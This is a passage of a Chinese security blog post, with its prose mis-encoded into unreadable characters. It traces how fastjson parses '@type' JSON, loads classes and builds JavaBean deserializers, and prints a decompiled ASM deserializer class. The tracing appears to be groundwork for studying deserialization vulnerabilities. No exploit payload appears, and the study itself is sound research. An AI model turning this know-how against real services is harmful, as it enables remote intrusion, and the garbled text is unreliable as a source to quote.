srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨ç»“æ„ä¸­å¯ä»¥çœ‹åˆ°å¾ˆå¤šä¸åŒå‚æ•°çš„parseObjectã€parseã€parseArrayã€‚éƒ½å¯èƒ½æˆä¸ºä»¥åä»£å®¡çš„æ¼æ´å…¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003103345930.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003103345930.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿåˆ°<code>JSON.parse(String text,int features)</code>ï¼Œå®ä¾‹åŒ–äº†ä¸€ä¸ªDefaultJSONParser</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105614114.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105614114.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ„é€ å‡½æ•°ä¼ å…¥çš„textï¼ˆæˆ‘ä»¬çš„jsonå­—ç¬¦ä¸²ï¼‰èµ‹å€¼ä¸ºlexer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105728090.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105728090.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿåˆ°<code>DefaultJSONParser.parse(Object fieldName)</code>ï¼Œé‡Œé¢æœ‰è®¸å¤šcase</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003104920361.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003104920361.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬ä¼ å…¥çš„æ˜¯jsonæ•°æ®ï¼Œä»¥<code>&#123;</code>å¼€å¤´ï¼Œè¿›å…¥case LBRACE</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105208140.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105208140.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105245491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003105245491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿåˆ°DefaultJSONParser.parseObject()</p><p>tryé‡Œçš„æ­»å¾ªç¯forï¼Œå°±æ˜¯è§£æjsonæ•°æ®äº†ã€‚ç®€å•è¯´ä¸€ä¸‹è¿™é‡Œé¢çš„é€»è¾‘ï¼š</p><ul><li>åŒ¹é…åˆ°é€—å·<code>,</code>è·³è¿‡</li><li>åŒ¹é…ä¸¤ä¸ªåŒå¼•å·ä¸­é—´çš„å­—ç¬¦ï¼Œè¿™é‡Œå°±æ˜¯<code>@type</code></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003125022038.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003125022038.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>å¦‚æœkeyä¸ºDEFAULT_TYPE_KEYï¼Œä¹Ÿå°±æ˜¯<code>@type</code>ï¼Œä¼šå–åé¢çš„valueå¹¶loadClass</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003125242734.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003125242734.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨è¿™ä¸ªloadClassé‡Œï¼Œä¼šåˆ¤æ–­&#96;[]ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003131336706.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003131336706.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åç»å…¸çš„ï¼ŒåŒäº²å§”æ´¾åŠ è½½ç±»ï¼ŒforNameä¼šè¿›è¡Œç±»çš„åŠ è½½å’Œåˆå§‹åŒ–ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œé™æ€ä»£ç å—ï¼Œä¸ä¼šæ‰§è¡Œæ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003135853001.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003135853001.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œå°±å®Œæˆäº†åŠ è½½Personç±»ã€‚</p><p>æ¥ç€å›åˆ°DefaulteJSONParser.parseObjectï¼Œç”¨getDeserializerè·å–ååºåˆ—åŒ–å™¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003142925510.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003142925510.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è·Ÿè·Ÿè·Ÿï¼Œè·Ÿåˆ°åšäº†ä¸€å †åˆ¤æ–­ï¼Œé€‰æ‹©äº†åˆ›å»ºé»˜è®¤çš„JavaBeanååºåˆ—åŒ–å™¨ã€‚ç»§ç»­è·ŸcreateJavaBeanDeserializer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003143539843.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003143539843.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>asmEnableé»˜è®¤ä¸ºtrueï¼Œè·Ÿè¿›åˆ°è°ƒç”¨JavaBeanInfo.build</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003160040739.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003160040739.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™å°±æ˜¯fastjsonå¤„ç†javaBeançš„æ ¸å¿ƒæ–¹æ³•</p><h2 id="javaBeanInfo-build"><a href="#javaBeanInfo-build" class="headerlink" title="javaBeanInfo.build"></a>javaBeanInfo.build</h2><p>åœ¨è¿™ä¸ªæ–¹æ³•é‡Œï¼š</p><ul><li>å…ˆè·å–äº†ç±»çš„æ‰€æœ‰å­—æ®µå’Œæ–¹æ³•</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003143847284.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003143847284.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>å†è·å–äº†é»˜è®¤æ„é€ å™¨</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003143947126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003143947126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å†™çš„æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144043684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144043684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>æŠŠæ„é€ å‡½æ•°è®¾ä¸ºå¯è®¿é—®</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144105301.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144105301.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>å…±æœ‰ä¸‰ä¸ªéå†ï¼Œåˆ†åˆ«æ˜¯éå†æ‰€æœ‰getterï¼Œéå†æ‰€æœ‰publicå­—æ®µï¼Œéå†æ‰€æœ‰getter</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003180642248.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003180642248.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆæ¥çœ‹setterçš„ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144313276.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144313276.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœä¸æ˜¯setterå°±è·³è¿‡ï¼Œéœ€è¦æ»¡è¶³setå¼€å¤´ï¼Œå‚æ•°é•¿åº¦ä¸º1ï¼Œéstaticï¼Œæ–¹æ³•åæ€»é•¿åº¦å¤§äº3</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144523824.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144523824.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶åï¼ŒæŠŠsetåç¬¬ä¸€ä¸ªå­—æ¯å°å†™ï¼Œå¹¶å–åé¢çš„å­—ç¬¦ä¸²ä¸ºå±æ€§å</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144616339.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144616339.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä»ç±»ä¸­å¯»æ‰¾è¯¥å±æ€§åçš„å­—æ®µï¼Œå¦‚æœæ²¡æœ‰ä¸”å­—æ®µæ˜¯boolç±»å‹ï¼Œåˆ™ç”¨<code>is</code>åŠ ä¸Šé¦–å­—æ¯å¤§å†™åçš„å­—æ®µå»æŸ¥æ‰¾ï¼ˆæ‰€ä»¥isNameè¿™ç§ä¹Ÿç®—setterï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144954173.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003144954173.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>OKï¼Œå¦‚æœæˆ‘ä»¬æœ¬æ¬¡éå†çš„æ–¹æ³•æ˜¯setParam1ï¼Œåˆ°è¿™é‡Œfieldå°±æ˜¯param1äº†</p><p>æŠŠè·å–åˆ°çš„å­—æ®µã€setteræ–¹æ³•åæ·»åŠ åˆ°fieldList</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003150216719.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003150216719.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªforå¾ªç¯ç»“æŸfieldListå­˜åœ¨param1å’Œparam2</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003145917167.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003145917167.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003150324014.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003150324014.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>å¯¹getterï¼Œå¦‚æœè¿”å›ç±»å‹æ˜¯å±äºCollection æˆ–å…¶å­ç±»ã€Map æˆ–å…¶å­ç±»ã€AtomicBooleanã€AtomicIntegerã€AtomicLongï¼Œä¸”æ²¡æœ‰å¯¹åº”çš„setteræ–¹æ³•ï¼Œæ‰ä¼šæŠŠgetteråŠ è¿›fieldList</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003153356032.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003153356032.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>buildåæœ‰ä¸€å †åˆ¤æ–­ï¼Œèƒ½æŠŠasmEnableç½®ä¸ºfalseï¼Œç›®å‰ä¸€ä¸ªä¹Ÿèµ°ä¸è¿›å»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003160415598.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003160415598.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœasmEnableä¸ºfalseï¼Œä¼šè¿”å›JavaBeanDeserializer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003162040875.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003162040875.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯è¿™é‡ŒasmEnableä¸ºtrueï¼Œè¿”å›asmFactory.creatJavaBeanDeserializer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003154017421.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003154017421.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™ä¸ªå‡½æ•°åˆ›å»ºçš„FastjsonASMDeserializer_1_Personç±»ä¼¼ä¹‹å‰å­¦ä¹ çš„ä¸´æ—¶å†™åœ¨ç¼“å­˜é‡Œçš„ä»£ç†ç±»ï¼Œä»–å†™äº†ä¸ªç±»ç„¶åå†å»ç±»åŠ è½½</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003163040027.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003163040027.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003162621852.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003162621852.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="æå–FastjsonASMDeserializer-1-Person"><a href="#æå–FastjsonASMDeserializer-1-Person" class="headerlink" title="æå–FastjsonASMDeserializer_1_Person"></a>æå–FastjsonASMDeserializer_1_Person</h2><p>å¯ä»¥æ¨¡æ‹Ÿè¿™ä¸ªæµç¨‹æŠŠcodeæå‡ºæ¥ï¼š</p><p>codeå‘å¸ƒåœ¨my githubï¼š</p><p><a href="https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/othercase/fastjson/extract_FastjsonASMDserializer.java">https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/othercase/fastjson/extract_FastjsonASMDserializer.java</a></p><p>è®°å¾—æ”¹createJavaBeanDeserializerå¤„çš„è¾“å‡ºè·¯å¾„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003173010126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241003173010126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æå–å‡ºçš„FastjsonASMDeserializerå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.alibaba.fastjson.parser.deserializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.DefaultJSONParser;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.JSONLexerBase;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParseContext;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.util.JavaBeanInfo;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Type;</span><br><span class="line"><span class="keyword">import</span> org.exploit.othercase.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonASMDeserializer_1_Person</span> <span class="keyword">extends</span> <span class="title class_">JavaBeanDeserializer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span>[] param2_asm_prefix__ = <span class="string">&quot;\&quot;param2\&quot;:&quot;</span>.toCharArray();</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span>[] param1_asm_prefix__ = <span class="string">&quot;\&quot;param1\&quot;:&quot;</span>.toCharArray();</span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer param2_asm_deser__;</span><br><span class="line">    <span class="keyword">public</span> ObjectDeserializer param1_asm_deser__;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FastjsonASMDeserializer_1_Person</span><span class="params">(ParserConfig var1, JavaBeanInfo var2)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(var1, var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">createInstance</span><span class="params">(DefaultJSONParser var1, Type var2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser var1, Type var2, Object var3, <span class="type">int</span> var4)</span> &#123;</span><br><span class="line">        <span class="type">JSONLexerBase</span> <span class="variable">var5</span> <span class="operator">=</span> (JSONLexerBase)var1.lexer;</span><br><span class="line">        <span class="keyword">if</span> (var5.token() == <span class="number">14</span> &amp;&amp; var5.isEnabled(var4, <span class="number">8192</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.deserialzeArrayMapping(var1, var2, var3, (Object)<span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.isEnabled(<span class="number">512</span>) &amp;&amp; var5.scanType(<span class="string">&quot;org.exploit.othercase.Person&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            Person var8;</span><br><span class="line">            <span class="type">int</span> var12;</span><br><span class="line">            String var14;</span><br><span class="line">            String var15;</span><br><span class="line">            label83: &#123;</span><br><span class="line">                <span class="type">ParseContext</span> <span class="variable">var6</span> <span class="operator">=</span> var1.getContext();</span><br><span class="line">                <span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                var8 = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">                <span class="type">ParseContext</span> <span class="variable">var9</span> <span class="operator">=</span> var1.getContext();</span><br><span class="line">                <span class="type">ParseContext</span> <span class="variable">var10</span> <span class="operator">=</span> var1.setContext(var9, var8, var3);</span><br><span class="line">                <span class="keyword">if</span> (var5.matchStat != <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                    var12 = <span class="number">0</span>;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">var13</span> <span class="operator">=</span> var5.isEnabled(<span class="number">4096</span>);</span><br><span class="line">                    String var10000;</span><br><span class="line">                    <span class="keyword">if</span> (var13) &#123;</span><br><span class="line">                        var12 |= <span class="number">1</span>;</span><br><span class="line">                        var10000 = var5.stringDefaultValue();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        var10000 = <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var14 = (String)var10000;</span><br><span class="line">                    <span class="keyword">if</span> (var13) &#123;</span><br><span class="line">                        var12 |= <span class="number">2</span>;</span><br><span class="line">                        var10000 = var5.stringDefaultValue();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        var10000 = <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var15 = (String)var10000;</span><br><span class="line">                    var14 = var5.scanFieldString(<span class="built_in">this</span>.param1_asm_prefix__);</span><br><span class="line">                    <span class="keyword">if</span> (var5.matchStat &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        var12 |= <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (var5.matchStat == -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span> label83;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    label85: &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var5.matchStat &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            ++var7;</span><br><span class="line">                            <span class="keyword">if</span> (var5.matchStat == <span class="number">4</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span> label85;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        var15 = var5.scanFieldString(<span class="built_in">this</span>.param2_asm_prefix__);</span><br><span class="line">                        <span class="keyword">if</span> (var5.matchStat &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            var12 |= <span class="number">2</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (var5.matchStat == -<span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label83;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (var5.matchStat &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            ++var7;</span><br><span class="line">                            <span class="keyword">if</span> (var5.matchStat == <span class="number">4</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span> label85;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (var5.matchStat != <span class="number">4</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span> label83;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((var12 &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                        var8.setParam1(var14);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ((var12 &amp; <span class="number">2</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                        var8.setParam2(var15);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var1.setContext(var9);</span><br><span class="line">                <span class="keyword">if</span> (var10 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    var10.object = var8;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var8;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((var12 &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                var8.setParam1(var14);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((var12 &amp; <span class="number">2</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                var8.setParam2(var15);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (Person)<span class="built_in">this</span>.parseRest(var1, var2, var3, var8, var4);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.deserialze(var1, var2, var3, var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">deserialzeArrayMapping</span><span class="params">(DefaultJSONParser var1, Type var2, Object var3, Object var4)</span> &#123;</span><br><span class="line">        <span class="type">JSONLexerBase</span> <span class="variable">var9</span> <span class="operator">=</span> (JSONLexerBase)var1.lexer;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> 